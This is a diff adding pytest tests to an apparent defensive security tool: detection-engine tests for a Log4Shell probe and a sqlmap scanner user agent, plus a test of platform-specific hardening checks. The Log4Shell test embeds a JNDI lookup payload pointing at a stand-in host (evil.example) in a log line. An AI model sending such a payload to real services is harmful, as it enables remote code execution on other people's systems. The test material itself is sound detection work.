@@ -98,9 +98,37 @@ def test_sqli_probe_detected():
     assert alerts
 
 
+def test_log4shell_probe_detected():
+    engine = DetectionEngine(load_rules())
+    line = ('203.0.113.5 - - [25/Jul/2026:10:00:00 +0000] '
+            '"GET / HTTP/1.1" 200 1 "-" "${jndi:ldap://evil.example/a}"')
+    alerts = [a for a in engine.run([line]) if a.rule_id == "OC-DET-WEB-LOG4SHELL"]
+    assert alerts and alerts[0].severity == "critical"
+
+
+def test_scanner_user_agent_detected():
+    engine = DetectionEngine(load_rules())
+    line = ('198.51.100.2 - - [25/Jul/2026:10:00:00 +0000] '
+            '"GET /admin HTTP/1.1" 404 1 "-" "sqlmap/1.7"')
+    assert [a for a in engine.run([line]) if a.rule_id == "OC-DET-SCANNER-UA"]
+
+
 # --------------------------------------------------------------------------
 # Report rendering
 # --------------------------------------------------------------------------
+def test_platform_routing_filters_checks():
+    from outcats.harden import checks
+
+    linux = {c.id for c in checks.all_checks(level=2, plat="linux")}
+    macos = {c.id for c in checks.all_checks(level=2, plat="macos")}
+    windows = {c.id for c in checks.all_checks(level=2, plat="windows")}
+    assert "OC-NET-001" in linux and "OC-NET-001" not in windows
+    assert any(i.startswith("OC-MAC-") for i in macos)
+    assert any(i.startswith("OC-WIN-") for i in windows)
+    # Windows-only checks must not leak into the Linux set.
+    assert not any(i.startswith("OC-WIN-") for i in linux)
+
+
 def test_report_counts_and_json():
     r = Report(module="harden", target="host")
     r.add(Finding("A", "ok", Severity.LOW, Status.PASS))
